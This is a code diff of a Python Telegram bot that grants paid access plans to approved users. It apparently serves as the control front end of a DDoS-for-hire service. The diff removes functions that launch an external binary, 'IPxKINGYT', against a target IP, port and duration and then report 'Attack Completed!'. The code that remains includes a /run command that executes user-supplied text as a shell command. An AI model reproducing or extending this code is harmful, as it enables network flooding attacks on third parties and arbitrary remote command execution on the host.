@@ -14,7 +14,6 @@ from threading import Thread
 
 loop = asyncio.get_event_loop()
 
-# Use environment variables for security
 TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
 MONGO_URI = os.getenv("MONGODB_URI")
 
@@ -31,23 +30,19 @@ users_collection = db.users
 bot = telebot.TeleBot(TOKEN)
 REQUEST_INTERVAL = 1
 
-# Admin Check Function
 def is_user_admin(user_id, chat_id):
     try:
         return bot.get_chat_member(chat_id, user_id).status in ['administrator', 'creator']
     except:
         return False
 
-# Check if user is approved
 def check_user_approval(user_id):
     user_data = users_collection.find_one({"user_id": user_id})
     return bool(user_data and user_data.get('plan', 0) > 0)
 
-# Message when user is not approved
 def send_not_approved_message(chat_id):
-    bot.send_message(chat_id, "*🚫 You are not approved! Contact Admin for access.*", parse_mode='Markdown')
+    bot.send_message(chat_id, "*YOU ARE NOT APPROVED! CONTACT ADMIN FOR ACCESS.*", parse_mode='Markdown')
 
-# Approve/Disapprove User
 @bot.message_handler(commands=['approve', 'disapprove'])
 def approve_or_disapprove_user(message):
     user_id = message.from_user.id
@@ -56,7 +51,7 @@ def approve_or_disapprove_user(message):
     cmd_parts = message.text.split()
 
     if not is_admin:
-        bot.send_message(chat_id, "*❌ You are not authorized to use this command*", parse_mode='Markdown')
+        bot.send_message(chat_id, "*You are not authorized to use this command*", parse_mode='Markdown')
         return
 
     if len(cmd_parts) < 2:
@@ -75,19 +70,18 @@ def approve_or_disapprove_user(message):
             {"$set": {"plan": plan, "valid_until": valid_until, "access_count": 0}},
             upsert=True
         )
-        msg_text = f"*✅ User {target_user_id} approved with plan {plan} for {days} days.*"
+        msg_text = f"*User {target_user_id} approved with plan {plan} for {days} days.*"
     else:
         users_collection.update_one(
             {"user_id": target_user_id},
             {"$set": {"plan": 0, "valid_until": "", "access_count": 0}},
             upsert=True
         )
-        msg_text = f"*❌ User {target_user_id} disapproved and reverted to free.*"
+        msg_text = f"*User {target_user_id} disapproved and reverted to free.*"
 
     bot.send_message(chat_id, msg_text, parse_mode='Markdown')
     bot.send_message(CHANNEL_ID, msg_text, parse_mode='Markdown')
 
-# Welcome Message
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
     markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)
@@ -100,7 +94,6 @@ def send_welcome(message):
 
     bot.send_message(message.chat.id, "*🚀 Welcome to the Secure Bot 🚀*", reply_markup=markup, parse_mode='Markdown')
 
-# Run System Command
 @bot.message_handler(commands=['run'])
 def run_command(message):
     user_id = message.from_user.id
@@ -119,6 +112,7 @@ def run_command(message):
         return
 
     try:
+
         result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=10)
         output = result.stdout.strip() if result.stdout else result.stderr.strip()
 
@@ -130,7 +124,6 @@ def run_command(message):
 
     bot.send_message(message.chat.id, f"```\n{output}\n```", parse_mode='Markdown')
 
-# Handle Button Clicks
 @bot.message_handler(func=lambda message: True)
 def handle_message(message):
     if message.text == "ℹ️ My Info":
@@ -164,36 +157,15 @@ def handle_message(message):
     else:
         bot.reply_to(message, "*Invalid option*", parse_mode='Markdown')
 
-# Automatically Start an Attack for Approved Users
-def auto_trigger_attack(chat_id, user_id):
-    if not check_user_approval(user_id):
-        send_not_approved_message(chat_id)
-        return
-
-    # Set default attack parameters
-    target_ip = "192.168.1.1"  # Replace with dynamic IP source if needed
-    target_port = 8080         # Example port
-    duration = 60              # Example duration in seconds
-
-    asyncio.run_coroutine_threadsafe(run_attack_command_async(chat_id, target_ip, target_port, duration), loop)
-
-async def run_attack_command_async(chat_id, target_ip, target_port, duration):
-    process = await asyncio.create_subprocess_shell(f"./IPxKINGYT {target_ip} {target_port} {duration}")
-    await process.communicate()
-
-    bot.send_message(chat_id, "*✅ Attack Completed!*", parse_mode='Markdown')
-
-# Start Asyncio Thread
 def start_asyncio_thread():
     asyncio.set_event_loop(loop)
     loop.run_until_complete(asyncio.sleep(REQUEST_INTERVAL))
 
-# Main Execution
 if __name__ == "__main__":
     asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
     asyncio_thread.start()
     logging.info("Secure Bot is Running...")
-
+    
     while True:
         try:
             bot.polling(none_stop=True, interval=3, timeout=20)
